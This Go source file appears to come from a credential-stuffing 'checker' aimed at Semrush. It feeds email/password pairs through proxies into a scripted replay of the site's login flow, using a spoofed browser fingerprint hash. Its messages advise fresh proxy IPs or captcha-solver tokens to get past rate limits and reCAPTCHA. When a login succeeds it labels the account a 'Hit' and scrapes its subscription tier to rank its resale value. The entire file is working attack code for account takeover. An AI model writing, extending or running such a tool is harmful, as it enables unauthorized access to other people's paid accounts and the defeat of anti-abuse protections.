package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"
)

var semrushPlanRE = regexp.MustCompile(`"(?:plan|product|subscription|toolkit|tariff|package)(?:Name|Title|Type|Id)?"\s*:\s*"([^"]{2,80})"`)

func (c *Checker) checkSemrush(email, password string, proxyURL *url.URL) CheckResult {
	result := CheckResult{Email: email, Password: password}

	client, err := c.freshClient(proxyURL)
	if err != nil {
		result.Status = StatusError
		result.Reason = err.Error()
		return result
	}

	uaHash := c.cfg.SemrushUserAgentHash()
	if uaHash == "" {
		result.Status = StatusError
		result.Reason = "missing user_agent_hash in config (FingerprintJS visitorId from browser capture)"
		return result
	}

	loginURL := c.cfg.LoginURL()
	referer := loginURL

	// Step 1: GET login page (session + site_csrftoken cookies)
	_, loginStatus, err := c.fetchURL(client, loginURL, map[string]string{
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"User-Agent": c.cfg.UserAgent,
	})
	if err != nil {
		status, reason := c.resultFromRequestErr("login page", err)
		result.Status = status
		result.Reason = reason
		return result
	}
	if loginStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason("login page HTTP 429")
		return result
	}
	if loginStatus != http.StatusOK {
		result.Status = StatusError
		result.Reason = fmt.Sprintf("login page HTTP %d", loginStatus)
		return result
	}

	// Step 2: GET /olaf then POST /olaf/init (_sm_bot session bootstrap)
	_, _, _, _ = c.doRequest(client, "GET", c.cfg.BaseURL()+"/olaf", map[string]string{
		"Accept":     "*/*",
		"Referer":    referer,
		"User-Agent": c.cfg.UserAgent,
	}, "")
	_, olafStatus, _, err := c.doRequest(client, "POST", c.cfg.SemrushOlafInitURL(), map[string]string{
		"Accept":     "*/*",
		"Origin":     c.cfg.BaseURL(),
		"Referer":    referer,
		"User-Agent": c.cfg.UserAgent,
	}, "")
	if err != nil {
		status, reason := c.resultFromRequestErr("olaf/init", err)
		result.Status = status
		result.Reason = reason
		return result
	}
	if olafStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason("olaf/init HTTP 429")
		return result
	}

	// Step 3: POST /sso/options (SSO flags — may indicate captcha)
	optsBody := fmt.Sprintf(`{"withCredentials":true,"user-agent-hash":%s}`, jsonString(uaHash))
	optsResp, optsStatus, _, err := c.doRequest(client, "POST", c.cfg.SemrushSSOOptionsURL(), map[string]string{
		"Accept":       "application/json, text/plain, */*",
		"Content-Type": "application/json",
		"Origin":       c.cfg.BaseURL(),
		"Referer":      referer,
		"User-Agent":   c.cfg.UserAgent,
	}, optsBody)
	if err != nil {
		status, reason := c.resultFromRequestErr("sso/options", err)
		result.Status = status
		result.Reason = reason
		return result
	}
	if optsStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason("sso/options HTTP 429")
		return result
	}
	if semrushResponseNeedsRecaptcha(optsResp) {
		result.Status = StatusRecaptchaRequired
		result.Reason = "reCAPTCHA required before login (too many checks from same IP/fingerprint)"
		return result
	}

	// Step 4: POST /sso/authorize
	authPayload := map[string]string{
		"locale":                "en",
		"source":                "semrush",
		"g-recaptcha-response":  "",
		"user-agent-hash":       uaHash,
		"email":                 email,
		"password":              password,
	}
	authJSON, _ := json.Marshal(authPayload)
	authBody, authStatus, authHeaders, err := c.doRequest(client, "POST", c.cfg.SemrushAuthorizeURL(), map[string]string{
		"Accept":       "application/json, text/plain, */*",
		"Content-Type": "application/json",
		"Origin":       c.cfg.BaseURL(),
		"Referer":      referer,
		"User-Agent":   c.cfg.UserAgent,
	}, string(authJSON))
	if err != nil {
		status, reason := c.resultFromRequestErr("sso/authorize", err)
		result.Status = status
		result.Reason = reason
		return result
	}
	if authStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason("sso/authorize HTTP 429")
		return result
	}

	if failReason := parseSemrushAuthFailure(authBody, authStatus); failReason != "" {
		if failReason == "recaptcha_required" {
			result.Status = StatusRecaptchaRequired
			result.Reason = "reCAPTCHA required — use 1 worker, fresh proxy IP, or captcha solver token"
		} else {
			result.Status = StatusFail
			result.Reason = failReason
		}
		return result
	}
	if semrushAuthBodyIndicatesFailure(authBody) {
		result.Status = StatusFail
		result.Reason = semrushAuthFailureReason(authBody, "invalid email or password")
		return result
	}
	if authStatus < 200 || authStatus >= 300 {
		result.Status = StatusFail
		result.Reason = fmt.Sprintf("login failed (HTTP %d)", authStatus)
		return result
	}

	c.followSemrushPostAuth(client, authBody, authHeaders)

	verified, accountEmail, verifyReason := c.verifySemrushAuthenticated(client)
	if !verified {
		result.Status = StatusFail
		if verifyReason == "" {
			verifyReason = "invalid email or password"
		}
		result.Reason = verifyReason
		return result
	}

	result.AccountEmail = accountEmail
	if result.AccountEmail == "" {
		result.AccountEmail = email
	}

	// Step 5: subscription header API (from ONF capture — Profile → Subscription Info)
	if result.PlanName == "" {
		if plan, ok := c.fetchSemrushSubscriptionPlan(client); ok {
			result.PlanName = plan
		}
	}

	// Step 6: fallback — dashboard HTML (legacy)
	if result.PlanName == "" {
		homeURL := c.cfg.Var("dashboard_url", c.cfg.BaseURL()+"/home/")
		homeBody, homeStatus, _, err := c.doRequest(client, "GET", homeURL, map[string]string{
			"Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Referer":    referer,
			"User-Agent": c.cfg.UserAgent,
		}, "")
		if err == nil && homeStatus == http.StatusOK {
			if plan, ok := extractSemrushPlanFromHTML(homeBody); ok {
				result.PlanName = plan
			}
		}
	}

	if result.PlanName == "" {
		result.PlanName = "Logged In"
		result.PlanLabel = "UNKNOWN"
		result.Status = StatusHit
		result.Reason = "login ok — subscription API unreachable"
		return result
	}

	result.PlanLabel = classifySemrushPlan(result.PlanName)
	result.Status = StatusHit
	return result
}

func (c *Checker) followSemrushPostAuth(client *http.Client, authBody string, authHeaders http.Header) {
	headers := map[string]string{
		"Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"User-Agent": c.cfg.UserAgent,
	}
	base := c.cfg.BaseURL()
	var urls []string
	if loc := authHeaders.Get("Location"); loc != "" {
		urls = append(urls, loc)
	}
	for _, key := range []string{"redirect", "redirect_to", "redirectUrl"} {
		if u, ok := jsonPathString(authBody, key); ok && u != "" {
			urls = append(urls, u)
		}
	}
	seen := map[string]struct{}{}
	for _, u := range urls {
		if !strings.HasPrefix(u, "http") {
			if strings.HasPrefix(u, "/") {
				u = base + u
			} else {
				u = base + "/" + u
			}
		}
		if _, ok := seen[u]; ok {
			continue
		}
		seen[u] = struct{}{}
		_, _, _, _ = c.doRequest(client, "GET", u, headers, "")
	}
}

func (c *Checker) verifySemrushAuthenticated(client *http.Client) (bool, string, string) {
	userInfoURL := c.cfg.Var("user_info_url", c.cfg.BaseURL()+"/accounts/user-info")
	headers := map[string]string{
		"Accept":     "application/json, text/plain, */*",
		"Referer":    c.cfg.Var("dashboard_url", c.cfg.BaseURL()+"/home/"),
		"User-Agent": c.cfg.UserAgent,
	}
	body, status, _, err := c.doRequest(client, "GET", userInfoURL, headers, "")
	if err != nil {
		return false, "", err.Error()
	}
	if status == http.StatusUnauthorized || status == http.StatusForbidden {
		return false, "", "invalid email or password"
	}
	if status != http.StatusOK {
		return false, "", fmt.Sprintf("not authenticated (user-info HTTP %d)", status)
	}
	email, _ := jsonPathString(body, "email")
	id, _ := jsonPathString(body, "id")
	if email == "" && id == "" {
		return false, "", "invalid email or password"
	}
	if activated, ok := jsonPathString(body, "activated"); ok && activated == "false" {
		return false, "", "account not activated"
	}
	return true, email, ""
}

func semrushAuthBodyIndicatesFailure(body string) bool {
	if success, ok := jsonPathString(body, "success"); ok && success == "false" {
		return true
	}
	if okVal, ok := jsonPathString(body, "ok"); ok && okVal == "false" {
		return true
	}
	code := semrushErrorCode(body)
	if strings.HasPrefix(code, "ERROR") {
		return true
	}
	return semrushAuthFailureReason(body, "") != ""
}

func semrushAuthFailureReason(body, fallback string) string {
	if reason := parseSemrushAuthFailure(body, 0); reason != "" && reason != "recaptcha_required" {
		return reason
	}
	if fallback != "" {
		return fallback
	}
	return "invalid email or password"
}

func (c *Checker) fetchSemrushSubscriptionPlan(client *http.Client) (string, bool) {
	subReferer := c.cfg.Var("subscription_page_url", c.cfg.BaseURL()+"/accounts/subscription-info/")
	apiHeaders := map[string]string{
		"Accept":     "application/json, text/plain, */*",
		"Referer":    subReferer,
		"User-Agent": c.cfg.UserAgent,
	}

	// Warm subscription session (browser loads this page before XHR calls).
	_, _, _, _ = c.doRequest(client, "GET", subReferer, map[string]string{
		"Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Referer":    c.cfg.Var("dashboard_url", c.cfg.BaseURL()+"/home/"),
		"User-Agent": c.cfg.UserAgent,
	}, "")

	headerURL := c.cfg.AccountQueryURL()
	headerBody, headerStatus, _, err := c.doRequest(client, "GET", headerURL, apiHeaders, "")
	if err == nil && headerStatus == http.StatusOK {
		if plan, ok := parseSemrushSubscriptionHeader(headerBody); ok {
			return plan, true
		}
	}

	toolkitsURL := c.cfg.Var("toolkits_summary_url", c.cfg.BaseURL()+"/accounts/subscription-info/api/v1/toolkits/summary/")
	toolkitsBody, toolkitsStatus, _, err := c.doRequest(client, "GET", toolkitsURL, apiHeaders, "")
	if err == nil && toolkitsStatus == http.StatusOK {
		if plan, ok := extractSemrushPurchasedToolkits(toolkitsBody); ok {
			return plan, true
		}
	}

	return "", false
}

func parseSemrushSubscriptionHeader(body string) (string, bool) {
	title, _ := jsonPathString(body, "subscription.title")
	isFree, _ := jsonPathString(body, "subscription.is_free")
	isSubUser, _ := jsonPathString(body, "subscription.is_sub_user")
	paidTill, _ := jsonPathString(body, "subscription.paid_till")

	title = strings.TrimSpace(title)
	if title != "" {
		if isSubUser == "true" && !strings.Contains(strings.ToLower(title), "sub") {
			title += " (Sub User)"
		}
		return title, true
	}
	if isFree == "true" {
		return "Free", true
	}
	if paidTill != "" && paidTill != "null" {
		return "Paid", true
	}
	return "", false
}

func extractSemrushPurchasedToolkits(body string) (string, bool) {
	var data struct {
		Toolkits []struct {
			Tiers []struct {
				Title       string `json:"title"`
				IsPurchased bool   `json:"is_purchased"`
			} `json:"tiers"`
		} `json:"toolkits"`
	}
	if err := json.Unmarshal([]byte(body), &data); err != nil {
		return "", false
	}
	var parts []string
	for _, tk := range data.Toolkits {
		for _, tier := range tk.Tiers {
			if tier.IsPurchased {
				parts = append(parts, strings.TrimSpace(tier.Title))
			}
		}
	}
	if len(parts) == 0 {
		return "", false
	}
	return strings.Join(parts, " + "), true
}

func (c *Checker) fetchURL(client *http.Client, rawURL string, headers map[string]string) (string, int, error) {
	retries := c.cfg.Settings.RetryOnError
	if retries < 0 {
		retries = 0
	}
	var body string
	var status int
	var err error
	for attempt := 0; attempt <= retries; attempt++ {
		body, status, _, err = c.doRequest(client, "GET", rawURL, headers, "")
		if err != nil {
			if isRateLimitErr(err) && attempt < retries {
				proxyRetrySleep(attempt)
				continue
			}
			if isRateLimitErr(err) {
				return "", http.StatusTooManyRequests, nil
			}
			return "", 0, err
		}
		if status == http.StatusOK {
			return body, status, nil
		}
		if isRateLimitedStatus(status) && attempt < retries {
			proxyRetrySleep(attempt)
			continue
		}
		return body, status, nil
	}
	return body, status, nil
}

func semrushErrorCode(body string) string {
	if code, ok := jsonPathString(body, "code"); ok {
		return strings.ToUpper(strings.TrimSpace(code))
	}
	if code, ok := jsonPathString(body, "error.code"); ok {
		return strings.ToUpper(strings.TrimSpace(code))
	}
	return ""
}

func semrushResponseNeedsRecaptcha(body string) bool {
	code := semrushErrorCode(body)
	if code == "ERROR_RECAPTCHA" || code == "ERROR_CAPTCHA" {
		return true
	}
	lower := strings.ToLower(body)
	if strings.Contains(lower, `"recaptcha_authorize"`) && strings.Contains(lower, `"enabled":true`) {
		return true
	}
	if strings.Contains(lower, `"captcha"`) && strings.Contains(lower, `"required":true`) {
		return true
	}
	if msg, ok := jsonPathString(body, "message"); ok {
		msgLower := strings.ToLower(msg)
		if strings.Contains(msgLower, "recaptcha") && strings.Contains(msgLower, "required") {
			return true
		}
	}
	if strings.Contains(lower, "recaptcha is required") {
		return true
	}
	return false
}

func parseSemrushAuthFailure(body string, status int) string {
	code := semrushErrorCode(body)
	lower := strings.ToLower(body)

	switch code {
	case "ERROR_RECAPTCHA", "ERROR_CAPTCHA":
		return "recaptcha_required"
	case "ERROR_INVALID_CREDENTIALS", "ERROR_WRONG_PASSWORD", "ERROR_USER_NOT_FOUND":
		return "invalid email or password"
	case "ERROR_UAHASH_INVALID":
		return "invalid user-agent-hash — update user_agent_hash in semrush.json from browser"
	case "ERROR_UAHASH_REQUIRED":
		return "missing user-agent-hash"
	case "ERROR_TOKEN_INVALID":
		return "invalid login token"
	}

	failPhrases := map[string]string{
		"wrong login or password":     "invalid email or password",
		"invalid email or password":   "invalid email or password",
		"incorrect email or password": "invalid email or password",
		"wrong password":              "invalid email or password",
		"account locked":              "account locked",
		"too many attempts":           "too many attempts",
	}
	for needle, reason := range failPhrases {
		if strings.Contains(lower, needle) {
			return reason
		}
	}
	if code != "" && strings.HasPrefix(code, "ERROR") {
		return code
	}
	if status == http.StatusUnauthorized || status == http.StatusForbidden {
		return "invalid email or password"
	}
	if status == http.StatusBadRequest || status == http.StatusUnprocessableEntity {
		if semrushResponseNeedsRecaptcha(body) {
			return "recaptcha_required"
		}
		if msg, ok := jsonPathString(body, "message"); ok && msg != "" {
			return msg
		}
	}
	// Some Semrush error payloads still return HTTP 2xx — body text already scanned above.
	return ""
}

func semrushAuthSucceeded(body string, status int) bool {
	if status < 200 || status >= 300 {
		return false
	}
	if semrushAuthBodyIndicatesFailure(body) {
		return false
	}
	if redirect, ok := jsonPathString(body, "redirect"); ok && redirect != "" {
		return true
	}
	if redirect, ok := jsonPathString(body, "redirect_to"); ok && redirect != "" {
		return true
	}
	if redirect, ok := jsonPathString(body, "redirectUrl"); ok && redirect != "" {
		return true
	}
	if okVal, ok := jsonPathString(body, "ok"); ok && okVal == "true" {
		return true
	}
	if success, ok := jsonPathString(body, "success"); ok && success == "true" {
		return true
	}
	// Empty authorize body is not proof of login — caller must verify session separately.
	return false
}

func extractSemrushPlanFromJSON(body string) (string, bool) {
	for _, path := range []string{
		"subscription.title",
		"subscription.name",
		"subscription.plan",
		"plan.name",
		"planName",
		"product.name",
		"toolkit.name",
		"data.subscription.name",
		"data.subscription.title",
		"data.plan.name",
	} {
		if val, ok := jsonPathString(body, path); ok && val != "" {
			return val, true
		}
	}
	return "", false
}

func extractSemrushPlanFromHTML(body string) (string, bool) {
	if plan, ok := extractSemrushPlanFromJSON(body); ok {
		return plan, true
	}
	matches := semrushPlanRE.FindAllStringSubmatch(body, -1)
	for _, m := range matches {
		if len(m) >= 2 {
			val := strings.TrimSpace(m[1])
			if val != "" && !strings.EqualFold(val, "null") {
				return val, true
			}
		}
	}
	needles := []string{
		"SEO Pro", "SEO Guru", "Business", "Semrush One", "Content Toolkit",
		"Local Pro", "Local Business", "Free", "Trial",
	}
	lower := strings.ToLower(body)
	for _, n := range needles {
		if strings.Contains(lower, strings.ToLower(n)) {
			return n, true
		}
	}
	return "", false
}

func classifySemrushPlan(planName string) string {
	lower := strings.ToLower(planName)
	switch {
	case strings.Contains(lower, "logged in"):
		return "UNKNOWN"
	case strings.Contains(lower, "trial"):
		return "FREE_TRIAL"
	case strings.Contains(lower, "free"):
		return "FREE"
	case strings.Contains(lower, "business"):
		return "BUSINESS"
	case strings.Contains(lower, "guru"):
		return "GURU"
	case strings.Contains(lower, "pro"):
		return "PRO"
	case strings.Contains(lower, "agency") || strings.Contains(lower, "enterprise"):
		return "ENTERPRISE"
	default:
		return "PAID"
	}
}
